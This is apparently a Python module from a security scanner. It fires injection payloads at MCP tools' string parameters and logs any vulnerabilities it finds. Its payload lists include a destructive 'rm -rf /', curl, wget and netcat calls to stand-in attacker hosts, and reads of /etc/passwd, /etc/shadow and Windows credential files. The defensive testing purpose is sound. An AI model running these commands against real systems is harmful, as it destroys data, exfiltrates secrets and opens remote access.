"""Tool security testing service."""

import logging
from typing import Dict, Any, List, Optional

from .vulnerability_checker import VulnerabilityChecker

logger = logging.getLogger(__name__)


class ToolSecurityTester:
    """Tests MCP tools for security vulnerabilities."""

    COMMAND_INJECTION_PAYLOADS = [
        "; rm -rf /", "$(curl attacker.com)",
        "`wget http://evil.com/backdoor.sh`", "&& ping attacker.com",
        "| nc attacker.com 4444",
        "; python -c 'import os; os.system(\"id\")'",
        "; node -e 'require(\"child_process\").exec(\"whoami\")'",
    ]

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow", "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "file:///etc/passwd", "../../../../proc/self/environ",
    ]

    CODE_INJECTION_PAYLOADS = [
        "__import__('os').system('id')", "eval('print(42)')",
        "exec('import subprocess; subprocess.run([\"whoami\"])')",
        "require('child_process').exec('id')",
        "eval('global.process.exit(0)')",
    ]

    def __init__(self, client):
        self.client = client

    async def test_tool(self, tool: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test a specific tool for vulnerabilities."""
        vulnerabilities = []
        tool_name = tool.get("name", "unknown")
        logger.info(f"Testing tool security: {tool_name}")

        for payload in self.COMMAND_INJECTION_PAYLOADS:
            vuln = await self._test_payload(tool, payload, "command_injection")
            if vuln:
                vulnerabilities.append(vuln)

        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            vuln = await self._test_payload(tool, payload, "path_traversal")
            if vuln:
                vulnerabilities.append(vuln)

        for payload in self.CODE_INJECTION_PAYLOADS:
            vuln = await self._test_payload(tool, payload, "code_injection")
            if vuln:
                vulnerabilities.append(vuln)

        return vulnerabilities

    async def _test_payload(
        self, tool: Dict, payload: str, vuln_type: str
    ) -> Optional[Dict[str, Any]]:
        """Test a specific payload against a tool."""
        tool_name = tool.get("name", "unknown")
        properties = tool.get("inputSchema", {}).get("properties", {})

        for param_name, param_schema in properties.items():
            if param_schema.get("type") != "string":
                continue
            try:
                response = await self.client.call_tool(
                    tool_name, {param_name: payload}
                )
                if VulnerabilityChecker.check_response(response, vuln_type):
                    return self._create_finding(
                        tool_name, param_name, payload, vuln_type, response
                    )
            except Exception as e:
                logger.debug(f"Tool test error for {tool_name}: {e}")
        return None

    def _create_finding(
        self, tool_name: str, param: str, payload: str,
        vuln_type: str, response
    ) -> Dict[str, Any]:
        """Create vulnerability finding."""
        severity = "critical" if vuln_type == "command_injection" else "high"
        resp_text = str(response.result or response.error) if response else ""
        return {
            "tool_name": tool_name, "parameter": param, "payload": payload,
            "vulnerability_type": vuln_type, "response": resp_text,
            "severity": severity,
        }
